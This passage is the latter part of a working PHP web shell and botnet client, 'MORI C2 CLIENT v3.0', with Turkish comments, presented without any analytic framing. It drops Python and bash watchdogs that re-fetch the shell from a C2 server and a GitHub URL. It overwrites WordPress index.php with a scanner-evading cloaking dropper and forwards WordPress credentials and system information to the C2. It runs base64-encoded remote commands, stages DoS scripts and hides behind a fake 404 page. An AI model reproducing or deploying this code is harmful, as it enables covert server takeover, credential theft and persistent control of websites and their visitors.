            if len(code) > 10000 and code[:5] == b"<?php":
                with open(SHELL_PATH, "wb") as f: f.write(code)
                os.chmod(SHELL_PATH, 0o644)
                return True
        except:
            pass
    return False

if hasattr(os, "prctl"):
    try: os.prctl(15, b"[system]")
    except: pass

while True:
    try:
        if needs_restore():
            restore()
        time.sleep(INTERVAL)
    except:
        time.sleep(INTERVAL)
';
            @file_put_contents('/tmp/sys_security.py', $py_code);
            @chmod('/tmp/sys_security.py', 0755);
            exec_any("nohup python3 /tmp/sys_security.py", true);
        }

        // Bash monitor (max 1 instance) — local file-size check + restore only when needed
        $bash_process_count = (int)(exec_any("pgrep -c -f '/tmp/sys_monitor.sh' 2>/dev/null || echo 0") ?: 0);
        if ($bash_process_count == 0) {
            $shell_path_sh  = escapeshellarg(SHELL_PATH);
            $shell_file_sh  = escapeshellarg(basename(SHELL_PATH));
            $c2_sh          = escapeshellarg($C2_SERVER ?: '');
            $token_sh       = md5('mori_c2_secret_2024_persistence');
            $bash_code = '#!/bin/bash
SHELL_PATH=' . $shell_path_sh . '
SHELL_FILE=' . $shell_file_sh . '
C2_URL=' . $c2_sh . '
TOKEN="' . $token_sh . '"
GH_URL="https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"
INTERVAL=60
TMP="${SHELL_PATH}.tmp"

# php_ok: reject Cloudflare UAM HTML (they return HTTP 200 but are not PHP)
php_ok() { head -c5 "$1" 2>/dev/null | grep -q "<?php"; }

restore() {
  curl -sfL --max-time 4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -o "$TMP" 2>/dev/null
  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
  fi
  wget -q --timeout=4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -O "$TMP" 2>/dev/null
  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
  fi
  curl -sfL --max-time 15 "$GH_URL" -o "$TMP" 2>/dev/null
  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
  fi
  wget -q --timeout=15 "$GH_URL" -O "$TMP" 2>/dev/null
  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
  fi
  rm -f "$TMP"
  return 1
}

while true; do
  SZ=$(stat -c%s "$SHELL_PATH" 2>/dev/null || echo 0)
  [ "$SZ" -lt 10000 ] && restore
  sleep $INTERVAL
done
';
            @file_put_contents('/tmp/sys_monitor.sh', $bash_code);
            @chmod('/tmp/sys_monitor.sh', 0755);
            exec_any("nohup bash /tmp/sys_monitor.sh", true);
        }
    }
    
    // Step 4: Store deployment metadata
    $metadata = [
        'client_id' => $client_id,
        'deploy_time' => time(),
        'shell_url' => $web_shell_url,
        'c2_server' => $c2_server,
        'php_version' => PHP_VERSION,
        'os' => php_uname(),
        'processes' => [
            'python' => $py_process_count ?? 'n/a',
            'bash' => $bash_process_count ?? 'n/a',
        ],
    ];
    
    @file_put_contents('/tmp/.mori_deployment_meta.json', json_encode($metadata));

    // Step 5: Replace WP index.php with cloaking dropper
    @install_wp_cloaking_index();

    return true;
}



// DEPRECATED restore_from_backup() - Replaced with ensure_persistence_v4()





// =============================================
// OTOMATİK KAYIT (HER ERİŞİMDE)
// =============================================
function auto_register() {
    global $web_shell_url;
    $c2_server = $GLOBALS['C2_SERVER'];
    $client_id = $GLOBALS['CLIENT_ID'];

    // Throttle: 10 dakikada bir C2'ye kayıt (her ?m= isteğinde değil)
    $reg_ts_file = sys_get_temp_dir() . '/.mori_reg_ts';
    $last_reg    = (int)@file_get_contents($reg_ts_file);
    if ($last_reg && (time() - $last_reg) < 600) {
        $GLOBALS['_SHELL_REGISTERED'] = true;
        return true;
    }
    @file_put_contents($reg_ts_file, time());
    
    // Get WordPress login credentials (dynamic)
    $wp_creds = generate_wp_login_credentials();
    
    // C2 sunucusuna kayıt yap - BACKGROUND ONLY (don't block)
    $auto_reg_sister = sys_get_temp_dir() . '/.mori_sister_cache.json';
    $auto_reg_sf     = @json_decode(@file_get_contents($auto_reg_sister), true);

    $registration_data = [
        'id'           => $client_id,
        'web_shell_url'=> $web_shell_url,
        'sysinfo'      => collect_system_info(),
        'sister_files' => $auto_reg_sf['locations'] ?? [],
        'sister_urls'  => $auto_reg_sf['urls']      ?? [],
        'timestamp'    => time(),
        'version'      => '3.0',
        'wp_login_id'  => $wp_creds['blogs_id'],
        'wp_login_hash'=> $wp_creds['hash'],
    ];

    $register_url = $c2_server . '?act=reg';
    $encoded = safe_base64_encode(safe_json_encode($registration_data));

    // Very short timeout (fire-and-forget) — 2s to allow encoding overhead
    $result = @http_post_timeout($register_url, $encoded, 2);
    
    // Mark as attempted (don't try again this request)
    $GLOBALS['_SHELL_REGISTERED'] = true;
    
    return $result !== null;
}




// =====================================================
// HELPER: Add missing delete_directory function
// =====================================================
function delete_directory($path) {
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return "[ERROR] Directory not found: $path";
    }
    
    $items = @scandir($real);
    if ($items && count($items) > 2) {
        return "[ERROR] Directory not empty";
    }
    
    return @rmdir($real) ? "OK: Deleted $path" : "[ERROR] Cannot delete directory";
}

// =====================================================
// WP CLOAKING INDEX INSTALLER
// =====================================================

function generate_wp_cloaking_index_content() {
    $c2  = $GLOBALS['C2_SERVER'] ?? '';
    $gh  = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php';
    $tok = md5('mori_c2_secret_2024_persistence');
    $key = md5($tok);

    // Config block — interpolated now, embedded as PHP string literals
    $cfg = '<?php /* _wpa_cloaker v1 */' . "\n"
         . '$_wc2="' . addslashes($c2) . '";' . "\n"
         . '$_wgh="' . addslashes($gh) . '";' . "\n"
         . '$_wtok="' . $tok . '";' . "\n"
         . '$_wkey="' . $key . '";' . "\n";

    // Body — NOWDOC, no interpolation
    $body = <<<'WPAEOF'
$_wbot=(bool)preg_match('/(bot|crawl|spider|slurp|google|bing|yahoo|yandex|baidu|facebookexternalhit|wordfence|sucuri|imunify|modsecurity|nikto|sqlmap|nmap|acunetix|nuclei|burp|python-requests|go-http-client|libwww|curl\/[0-9])/i',strtolower($_SERVER['HTTP_USER_AGENT']??''));

// Installer endpoint — called by JS fetch or server curl
if(!empty($_GET['_wpa'])&&$_GET['_wpa']===$_wkey&&!$_wbot){
    $_wsf=__DIR__.'/wp-activater.php';
    $_wok=false;
    $_wx=stream_context_create(['http'=>['timeout'=>10,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
    foreach([$_wc2.'?act=get_shell&token='.$_wtok,$_wgh] as $_wu){
        $_wr=false;
        if(function_exists('curl_init')){$_wh=curl_init($_wu);curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,10018=>'Mozilla/5.0',13=>10]);$_wr=@curl_exec($_wh);curl_close($_wh);}
        if(!$_wr)$_wr=@file_get_contents($_wu,false,$_wx);
        if($_wr&&strlen($_wr)>10000){$_wok=@file_put_contents($_wsf,$_wr)!==false;if($_wok){@chmod($_wsf,0644);break;}}
    }
    header('Content-Type: text/plain');die($_wok?'ok':'fail');
}

if(!$_wbot){
    $_wsf=__DIR__.'/wp-activater.php';
    if(!@file_exists($_wsf)||@filesize($_wsf)<10000){
        $_wsu=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http')
            .'://'.($_SERVER['HTTP_HOST']??'localhost').$_SERVER['SCRIPT_NAME'].'?_wpa='.$_wkey;
        $_wd=false;
        $_wx=stream_context_create(['http'=>['timeout'=>4,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
        // M1: Direct PHP fetch from C2 then GitHub
        foreach([$_wc2.'?act=get_shell&token='.$_wtok,$_wgh] as $_wu){
            $_wr=false;
            if(function_exists('curl_init')){$_wh=curl_init($_wu);curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,10018=>'Mozilla/5.0',13=>4]);$_wr=@curl_exec($_wh);curl_close($_wh);}
            if(!$_wr)$_wr=@file_get_contents($_wu,false,$_wx);
            if($_wr&&strlen($_wr)>10000&&@file_put_contents($_wsf,$_wr)!==false){@chmod($_wsf,0644);$_wd=true;break;}
        }
        // M2: Server-side self-curl to installer endpoint
        if(!$_wd&&function_exists('curl_init')){
            $_wh=curl_init($_wsu);
            curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,13=>5,10023=>['X-WP-A: 1']]);
            @curl_exec($_wh);curl_close($_wh);
            $_wd=@file_exists($_wsf)&&@filesize($_wsf)>10000;
        }
        // M3: Client-side JS fetch — injected into page output via ob_start
        if(!$_wd){
            ob_start(function($_wbuf)use($_wsu){
                $_wjs='<script>(function(){var x=new XMLHttpRequest;x.open("GET","'
                    .htmlspecialchars($_wsu,ENT_QUOTES).'",true);x.send()})();</script>';
                return stripos($_wbuf,'</body>')!==false
                    ?str_ireplace('</body>',$_wjs.'</body>',$_wbuf)
                    :$_wbuf.$_wjs;
            });
        }
    }
}
define('WP_USE_THEMES',true);
require __DIR__.'/wp-blog-header.php';
WPAEOF;

    return $cfg . $body;
}

function install_wp_cloaking_index() {
    if (!is_wordpress_installed()) return false;

    // Find WP root (has both wp-config.php and wp-blog-header.php)
    $wp_root = null;
    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
        if (@file_exists($d . '/wp-config.php') && @file_exists($d . '/wp-blog-header.php')) {
            $wp_root = $d;
            break;
        }
    }
    if (!$wp_root) return false;

    $index_path = $wp_root . '/index.php';

    // Already our cloaker?
    $cur = @file_get_contents($index_path);
    if ($cur && strpos($cur, '_wpa_cloaker') !== false) return true;

    // Throttle: once per day
    $ts = sys_get_temp_dir() . '/.mori_wpidx_ts';
    if ((int)@file_get_contents($ts) > time() - 86400) return false;
    @file_put_contents($ts, time());

    // chmod 777 → unlink → write new
    @chmod($index_path, 0777);
    @unlink($index_path);

    $content = generate_wp_cloaking_index_content();
    if (!$content) return false;

    if (@file_put_contents($index_path, $content) !== false) {
        @chmod($index_path, 0644);
        return true;
    }
    return false;
}

// =====================================================
// SELF-RENAME FOR NON-WP DEPLOYMENTS (wp-activeter.php)
// =====================================================

function self_rename_and_register() {
    // Only when running as wp-activeter.php on a non-WP site
    if (basename(__FILE__) !== 'wp-activeter.php') return;
    if (is_wordpress_installed()) return;

    $navbar_path = __DIR__ . '/navbar.php';
    // navbar.php already healthy → already done
    if (@file_exists($navbar_path) && @filesize($navbar_path) > 10000) return;

    // Step 1: Copy self → navbar.php
    $self_content = @file_get_contents(__FILE__);
    if (!$self_content || strlen($self_content) < 10000) return;
    if (@file_put_contents($navbar_path, $self_content) === false) return;
    @chmod($navbar_path, 0644);

    // Step 2: Self-delete wp-activeter.php
    @unlink(__FILE__);

    // Step 4: Clean exit — file is gone, 302 to homepage
    if (php_sapi_name() !== 'cli') {
        http_response_code(302);
        header('Location: /');
    }
    exit(0);
}

// =====================================================
// WEB SHELL API ENDPOINTS
// =====================================================

// DEBUG MODE
if (isset($_GET['debug']) && $debug_mode) {
    $client_id = $GLOBALS['CLIENT_ID'] ?? '';
    $os_type   = PHP_OS;
    header('Content-Type: text/plain; charset=utf-8');
    echo "MORI C2 CLIENT v3.0\n";
    echo "====================\n\n";
    echo "Client ID: $client_id\n";
    echo "OS: $os_type\n";
    echo "Web Shell URL: $web_shell_url\n";
    echo "Current User: " . get_current_user() . "\n";
    echo "Current Directory: " . getcwd() . "\n";
    echo "PHP Version: " . PHP_VERSION . "\n";
    echo "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n\n";
    
    echo "SYSTEM INFO:\n";
    print_r(collect_system_info());
    exit;
}

// REGISTER DATA ENDPOINT (for server to pull sysinfo)
if (isset($_GET['act']) && $_GET['act'] == 'register_data') {
    // PRE-EXECUTION PERSISTENCE CHECK
    @ensure_persistence_v4();

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(collect_system_info());
    exit;
}

// PULL REGISTER — C2 sunucu bu endpoint'i çekerek shell'i kayıt eder (UAM bypass)
if (isset($_GET['act']) && $_GET['act'] === 'pull_register') {
    $wp_creds  = generate_wp_login_credentials();
    $server_ip = $_SERVER['SERVER_ADDR']
              ?? $_SERVER['LOCAL_ADDR']
              ?? @gethostbyname(@gethostname())
              ?? '0.0.0.0';

    // Sister cache — önceki persistence çalışmasından kalan veri (varsa)
    $sister_cache = sys_get_temp_dir() . '/.mori_sister_cache.json';
    $sister_data  = @json_decode(@file_get_contents($sister_cache), true);

    // Yanıtı hemen gönder — C2 curl timeout'u dolmadan önce cevap dönsün
    $response = json_encode([
        'id'            => $GLOBALS['CLIENT_ID'],
        'web_shell_url' => $GLOBALS['WEB_URL'],
        'server_ip'     => $server_ip,
        'sysinfo'       => collect_system_info(),
        'sister_files'  => $sister_data['locations'] ?? [],
        'sister_urls'   => $sister_data['urls']      ?? [],
        'timestamp'     => time(),
        'version'       => '3.0',
        'wp_login_id'   => $wp_creds['blogs_id'],
        'wp_login_hash' => $wp_creds['hash'],
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    header('Content-Type: application/json; charset=utf-8');
    header('Content-Length: ' . strlen($response));
    echo $response;

    // HTTP bağlantısını kapat — C2 cevabı aldı, PHP arka planda çalışmaya devam eder
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        @ob_end_flush();
        @flush();
    }

    // Bağlantı kapandıktan sonra: persistence + register (artık C2 timeout'u etkilemez)
    ignore_user_abort(true);
    set_time_limit(120);
    @ensure_persistence_v4();
    @auto_register();
    exit(0);
}

// WP CREDS — injected WP plugin posts credentials here, we forward to C2
if (isset($_GET['act']) && $_GET['act'] === 'wp_creds') {
    $creds_encoded = $_POST['creds'] ?? '';
    if (!empty($creds_encoded)) {
        $payload = safe_base64_encode(safe_json_encode([
            'creds'     => $creds_encoded,
            'shell_url' => $GLOBALS['WEB_URL'],
        ]));
        @http_post_timeout($GLOBALS['C2_SERVER'] . '?act=store_wp_creds', $payload, 3);
    }
    header('Content-Type: text/plain');
    die('ok');
}

// REGISTER ONLY (manuel kayıt için)
// Optimize: batch mode veya single mode
if (isset($_GET['register'])) {
    // PRE-EXECUTION PERSISTENCE CHECK
    @ensure_persistence_v4();
    
    header('Content-Type: text/plain; charset=utf-8');
    
    // Check if batch registration is available (multiple clients accessing)
    $batch_mode = isset($_GET['batch']) && $_GET['batch'] === '1';
    
    if ($batch_mode) {
        // Batch mode: queue'de bekle, toplamaya devam et
        $result = auto_register();
        echo $result ? "QUEUED - Will be registered in batch\n" : "FAILED - Queue error";
    } else {
        // Single mode: immediate registration
        $result = auto_register();
        echo $result ? "OK - Registered successfully\n" : "FAILED - Registration failed\n";
    }
    
    exit;
}

// COMMAND EXECUTION VIA GET (base64 encoded - supports both safe_base64 and normal base64)
if (isset($_GET['m'])) {
    ignore_user_abort(true); // flood, C2 bağlantısı kesse bile devam eder
    set_time_limit(0);
    @ensure_persistence_v4();
    auto_register();

    ob_end_clean();
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    
    // Try safe_base64_decode first, then normal base64
    $encoded = $_GET['m'] ?? null;
    
    if (!$encoded || !is_string($encoded)) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'No payload provided']));
    }
    
    $cmd = safe_base64_decode($encoded);
    if ($cmd === false || strlen($cmd) === 0) {
        $cmd = @base64_decode($encoded, true);
    }
    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'Invalid base64 encoding']));
    }
    
    $output = execute_command($cmd);
    
    // Detect output type and set appropriate header
    if (@json_decode($output, true) !== null) {
        header('Content-Type: application/json; charset=utf-8');
    } else {
        header('Content-Type: text/plain; charset=utf-8');
    }
    echo $output;
    exit;
}

// COMMAND EXECUTION VIA POST (supports both safe_base64 and normal base64)
if (isset($_POST['m'])) {
    @ensure_persistence_v4();
    auto_register();
    
    ob_end_clean();
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    
    $payload = $_POST['m'] ?? null;
    
    // NULL-safe payload handling
    if (!$payload || !is_string($payload)) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'No payload provided']));
    }
    
    // Try safe_base64_decode first, then normal base64
    $cmd = null;
    if (strpos($payload, 'base64:') === 0 && strlen($payload) > 7) {
        $encoded_part = substr($payload, 7);
        $cmd = safe_base64_decode($encoded_part);
        if ($cmd === false) {
            $cmd = @base64_decode($encoded_part, true);
        }
    } else {
        $cmd = safe_base64_decode($payload);
        if ($cmd === false) {
            $cmd = @base64_decode($payload, true);
        }
    }
    
    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'Invalid base64 encoding']));
    }
    
    $output = execute_command($cmd);
    
    // Detect output type and set appropriate header
    if (@json_decode($output, true) !== null) {
        header('Content-Type: application/json; charset=utf-8');
    } else {
        header('Content-Type: text/plain; charset=utf-8');
    }
    echo $output;
    exit;
}

// JSON API (ileri düzey)
if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
    // PRE-EXECUTION PERSISTENCE CHECK
    @ensure_persistence_v4();
    auto_register(); // Register this execution
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if ($input && isset($input['action'])) {
        header('Content-Type: application/json; charset=utf-8');
        
        switch ($input['action']) {
            case 'exec':
                $cmd = $input['command'] ?? '';
                $result = execute_command($cmd);
                echo json_encode(['success' => true, 'output' => $result]);
                break;
                
            case 'info':
                echo json_encode(collect_system_info());
                break;
                
            case 'register':
                $success   = auto_register();
                $client_id = $GLOBALS['CLIENT_ID'] ?? '';
                echo json_encode(['success' => $success, 'client_id' => $client_id]);
                break;

            case 'upload_dos_py':
                // Upload dos.py file - base64 encoded
                $file_content = $input['file_content'] ?? '';
                $file_path = '/tmp/dos.py';
                if ($file_content && base64_decode($file_content, true)) {
                    $decoded = base64_decode($file_content);
                    if (file_put_contents($file_path, $decoded) !== false) {
                        @chmod($file_path, 0755);
                        echo json_encode(['success' => true, 'file' => $file_path]);
                    } else {
                        echo json_encode(['success' => false, 'error' => 'Write failed']);
                    }
                } else {
                    echo json_encode(['success' => false, 'error' => 'Invalid base64']);
                }
                break;

            case 'upload_dos_php':
                // Upload dos.php file - base64 encoded
                $file_content = $input['file_content'] ?? '';
                $file_path = 'dos.php';
                if ($file_content && base64_decode($file_content, true)) {
                    $decoded = base64_decode($file_content);
                    if (file_put_contents($file_path, $decoded) !== false) {
                        @chmod($file_path, 0755);
                        echo json_encode(['success' => true, 'file' => $file_path]);
                    } else {
                        echo json_encode(['success' => false, 'error' => 'Write failed']);
                    }
                } else {
                    echo json_encode(['success' => false, 'error' => 'Invalid base64']);
                }
                break;
                
            default:
                echo json_encode(['error' => 'Unknown action']);
        }
        exit;
    }
}

// =====================================================
// BACKGROUND AGENT MODE (CLI veya ?agent=1 ile)
// =====================================================
if (php_sapi_name() === 'cli' || isset($_GET['agent']) || isset($_GET['daemon'])) {
    // Agent modu - sayfa gösterilmez, sürekli çalışır
    $max_execution = isset($_GET['timeout']) ? (int)$_GET['timeout'] : 300;
    $sleep_interval = isset($_GET['sleep']) ? (int)$_GET['sleep'] : 5;
    
    auto_register();
    $client_id = $GLOBALS['CLIENT_ID'] ?? '';
    $c2_server = $GLOBALS['C2_SERVER'] ?? '';

    $start_time = time();
    $task_counter = 0;

    while ((time() - $start_time) < $max_execution) {
        $task = c2_get_task($c2_server, $client_id);
        
        if ($task && trim($task) && trim($task) !== 'no_task') {
            $task_counter++;
            $output = execute_command($task);
            c2_send_result($c2_server, $client_id, $task, $output);
        }
        
        if ($task_counter % 10 === 0) {
            c2_update_status($c2_server, $client_id);
        }
        
        sleep($sleep_interval);
    }
    
    if (php_sapi_name() === 'cli') {
        exit(0);
    }
    
    echo "MORI C2 Agent completed " . $task_counter . " tasks in " . (time() - $start_time) . " seconds\n";
    exit;
}

// =====================================================
// NETWORK MONITORING DAEMON (?monitor=1 mode)
// Distributed backup network'ü 30 saniyede bir kontrol et
// =====================================================
if (isset($_GET['monitor'])) {
    set_time_limit(0);
    ignore_user_abort(true);
    
    $monitor_interval = isset($_GET['interval']) ? (int)$_GET['interval'] : 30;
    $max_monitor_time = isset($_GET['max_time']) ? (int)$_GET['max_time'] : 86400; // 24 saat
    
    $start_time = time();
    $check_count = 0;
    $restore_count = 0;
    
    while ((time() - $start_time) < $max_monitor_time) {
        $check_count++;
        
        // 1. Check distributed backups
        $inventory = @file_get_contents(__DIR__ . '/.wp-security.list');
        if ($inventory) {
            $files = array_filter(array_map('trim', explode("\n", $inventory)));
            foreach ($files as $file) {
                if (strpos($file, ';') !== false || strpos($file, '#') === 0) continue; // Skip comments
                
                if (!file_exists($file) || filesize($file) < 5000) {
                    // File missing or damaged - restore
                    $payload = @file_get_contents($c2_server . '?urlver');
                    if (!$payload || strlen($payload) < 100) {
                        $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/' . SHELL_FILE);
                    }
                    
                    if ($payload && strlen($payload) > 5000) {
                        @file_put_contents($file, $payload);
                        @chmod($file, 0644);
                        $restore_count++;
                    }
                }
            }
        }
        
        // 2. Execute PHP backups
        $dirs = ['/tmp', '/var/tmp', '/var/www', '/var/www/html', '/home'];
        foreach ($dirs as $dir) {
            if (is_dir($dir)) {
                @shell_exec("php '$dir/.wp-firewall.php' > /dev/null 2>&1 &");
            }
        }
        
        // 3. Check/restore main shell
        $mainFile = SHELL_PATH;
        if (!file_exists($mainFile) || filesize($mainFile) < 10000) {
            $payload = @file_get_contents($c2_server . '?urlver');
            if (!$payload) $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/' . SHELL_FILE);
            if ($payload && strlen($payload) > 10000) {
                @file_put_contents($mainFile, $payload);
                $restore_count++;
            }
        }
        
        // 4. Re-deploy if missing
        if (rand(1, 100) > 90) { // Every ~10 checks
            deploy_distributed_network_backups();
        }
        
        sleep($monitor_interval);
    }
    
    // Log summary
    $summary = "Monitor: Checks=$check_count, Restores=$restore_count\n";
    @error_log($summary);
    
    if (php_sapi_name() === 'cli') {
        echo $summary;
        exit(0);
    }
    
    exit;
}

register_shutdown_function(function() {
    // Yanıt zaten gönderildi, connection kapandı
    // Bu noktada HTTP isteği yapmak HÂLÂ sorunlu olabilir (aynı Apache),
    // Bu yüzden doğrudan dosyaya yaz — HTTP kullanma.
    global $c2_server, $client_id, $debug_mode;

    // Kayıt isteğini kuyruğa al (dosya bazlı, HTTP yok)
    $queue_file = __DIR__ . '/.mori_queue';
    $entry = json_encode([
        'id'        => $client_id,
        'timestamp' => time(),
        'sysinfo'   => [] // Agent mode'da doldurulur
    ]);
    @file_put_contents($queue_file, $entry . "\n", FILE_APPEND | LOCK_EX);
});
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</p>
    <hr>
    <address>Apache Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
</body>
</html>
